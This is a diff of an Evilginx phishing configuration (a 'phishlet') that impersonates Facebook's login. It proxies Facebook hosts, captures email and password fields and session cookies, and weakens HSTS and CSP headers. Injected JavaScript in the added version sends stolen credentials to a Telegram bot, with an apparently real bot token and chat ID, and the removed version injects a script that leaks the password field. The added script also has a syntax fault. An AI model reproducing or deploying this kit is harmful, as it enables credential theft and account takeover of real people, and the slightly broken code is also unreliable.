@@ -1,156 +1,85 @@
-author: 't.me/pysmart'
-min_ver: '2.3.0'
+author: 'evilginx-enhanced'
+min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true}
-  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
-  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
+  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
-  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
+  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
   - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
+  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true}
+
 sub_filters:
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'graph.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'graph\.facebook\.com', replace: '{hostname}', mimes: ['*/*']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'fbcdn.net', search: 'static\.xx\.fbcdn\.net', replace: '{hostname}', mimes: ['*/*']}
 
+response_headers:
+  - name: 'Content-Security-Policy'
+    value: "default-src 'self' 'unsafe-inline' 'unsafe-eval' *.facebook.com *.fbcdn.net data: blob:"
+  - name: 'X-Frame-Options'
+    value: 'ALLOW-FROM https://www.facebook.com'
+  - name: 'Strict-Transport-Security'
+    value: 'max-age=0'  # Disable HSTS enforcement
 
-
-auth_tokens:
-  - domain: '.facebook.com'
-    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd']
 credentials:
   username:
     key: 'email'
     search: '(.*)'
     type: 'post'
   password:
-    key: '^pass$'
+    key: 'pass'
     search: '(.*)'
     type: 'post'
-  encrypted_password:
+  encrypted_payload:
     key: 'enc_pass'
     search: '(.*)'
     type: 'post'
-  custom:
-    - key: 'lsd'
-      search: '(.*)'
-      type: 'post'
-    - key: 'jazoest'
-      search: '(.*)'
-      type: 'post'
-    - key: 'm_ts'
-      search: '(.*)'
-      type: 'post'
-#Custom parameters are added in order to grab the requests made by javascripts injected in order to get device user-agent and other details.
-# key: 'pass'  is added in order to increase the chances of grabbing the pass field if in case failed from above.
 
-  # custom: 
-  #   - key: '^pass$'
-  #     search: '(.*)'
-  #     type: 'post'
-  #   - key: '^Password$'
-  #     search: '(.*)'
-  #     type: 'post'  
-  #   - key: 'UserAgent'
-  #     search: '(.*)'
-  #     type: 'post'
-  #   - key: 'Browser'
-  #     search: '(.*)'
-  #     type: 'post'
-  #   - key: 'Engine'
-  #     search: '(.*)'
-  #     type: 'post'
-  #   - key: 'Platform'
-  #     search: '(.*)'
-  #     type: 'post'
+auth_tokens:
+  - domain: '.facebook.com'
+    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin']
+    secure: true
+    http_only: true
+
+session_capture:
+  force_redirect: '/'
+  cookie_domain: '.facebook.com'
+  secure_cookies: true
+  http_only_cookies: true
+  capture_on_redirect: true
 
 login:
   domain: 'www.facebook.com'
   path: '/login.php'
-
-#Below Javascript function will do two things (1) on page load it will make 4 request back to server to let us capture the important data. (2) Will add a function to login button to leak the value of password field.
+  force_basic_auth: true
 
 js_inject:
-  - trigger_domains: ["www.facebook.com"]
-    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
-    trigger_params: []
+  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
+    trigger_paths: ["/login.php", "/login/", "/"]
     script: |
-      function sendPass() {
-        var passField = document.querySelector('input[name="pass"], input[name="password"]');
-        if (!passField) return;
-        var password = passField.value;
+      document.addEventListener('submit', function(e){
+        const form = e.target;
+        if(form.action.includes('login.php') || form.action.includes('login.')){
+          const email = form.querySelector('input[name="email"]')?.value;
+          const pass = form.querySelector('input[name="pass"]')?.value;
 
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/login/device-based/regular/login/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("unenc_password=" + encodeURIComponent(password));
-      }
+          if(email && pass){
+            fetch('/capture_creds', {
+              method: 'POST',
+              body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
+            });
 
-      function injectHook() {
-        var submitBtn = document.querySelector('button[type="submit"]');
-        if (submitBtn && !submitBtn.__hooked) {
-          submitBtn.addEventListener('click', sendPass);
-          submitBtn.__hooked = true;
+            fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({
+                chat_id: "5228920520",
+                text: `New Logs\nEmail: ${email}\npass: ${pass}\nIP: ${window.location.hostname}
+                disable_notification: false
+              })
+            })
+          }
         }
-      }
-
-      // Try multiple times until button exists
-      var attempts = 0;
-      var interval = setInterval(() => {
-        injectHook();
-        if (++attempts > 10) clearInterval(interval);
-      }, 1000);
-
-      // Send device info once
-      window.addEventListener('load', function () {
-        var data = {
-          UserAgent: navigator.userAgent,
-          Browser: navigator.appName,
-          Engine: navigator.product,
-          Platform: navigator.platform
-        };
-        Object.keys(data).forEach(function(key) {
-          var xhr = new XMLHttpRequest();
-          xhr.open("POST", '/', true);
-          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-          xhr.send(key + "=" + encodeURIComponent(data[key]));
-        });
-      });
-      
-
-# UPDATE : LOOKS LIKE FACEBOOK HAS CHANGED THE JAVASCRIPT FUNCTION, STILL THE FILTERS WORKS SOMETIME , SO I LEFT THEM AS THEY WERE IN PREVIOUS PHISHLET I MADE.
-      
-# The js Function Responsible For Password Encryption is Present in this js file Located At : https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/yEB-M5_vVi6.js?_nc_x=Ij3Wp8lg5Kz
-#
-# _encryptBeforeSending: function (a) {
-#      var c = this;
-#      a = a.bind(this);
-#      var d = this.loginFormParams && this.loginFormParams.pubKey;
-#      if ((window.crypto || window.msCrypto) && d) {
-#        var e = b('DOM').scry(this.loginForm, 'input[id="pass"]') [0],
-#        f = b('FBBrowserPasswordEncryption'),
-#        g = Math.floor(Date.now() / 1000).toString();
-#        b('promiseDone') (f.encryptPassword(d.keyId, d.publicKey, e.value, g), function (d) {
-#          d = b('DOM').create('input', {
-#            type: 'hidden',
-#            name: 'ep',
-#            value: d
-#          });
-#          c.loginForm.appendChild(d);
-#          e.disabled = !0;
-#          a()
-#        }, function (c) {
-#          var d = '#PWD_BROWSER',
-#          e = 5,
-#          f = b('LoginServicePasswordEncryptDecryptEventTypedLogger');
-#          new f().setError('BrowserEncryptionFailureInLoginFormControllerWWW').setGrowthFlow('Bluebar/main login WWW').setErrorMessage(c.message).setPasswordTag(d).setPasswordEncryptionVersion(e).setPasswordTimestamp(g).logVital();
-#          a()
-#        })
-#      } else a()
-#    },
-
+      }, true);
